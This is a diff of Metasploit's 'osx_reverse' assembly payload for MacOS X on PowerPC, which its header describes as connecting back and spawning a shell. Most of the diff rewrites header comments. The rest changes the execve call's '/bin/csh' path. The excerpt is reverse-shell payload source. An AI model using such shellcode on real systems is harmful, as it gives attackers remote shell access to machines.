@@ -1,6 +1,21 @@
-;      Title:  MacOS X Reverse Connect
-;  Platforms:  MacOS X (Tested 10.3.3 | 10.3.4)
-;     Author:  hdm[at]metasploit.com (using ghandi execve foo)
+;;
+;
+;        Name: osx_reverse
+;   Qualities: Can Have Nulls
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore <hdm [at] metasploit.com>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Connects back and spawns a shell
+;
+;;
 
 
 .globl _main
@@ -60,4 +75,9 @@ _execsh:
         li      r0, 59
         sc                      ; execve(path, argv, NULL)
         xor     r0, r0, r0      ; testing
-path:   .asciz "/bin/csh"
+
+; csh removes the need for setuid()
+path:
+        .ascii  "/bin/csh"
+        .long   0x00414243
+
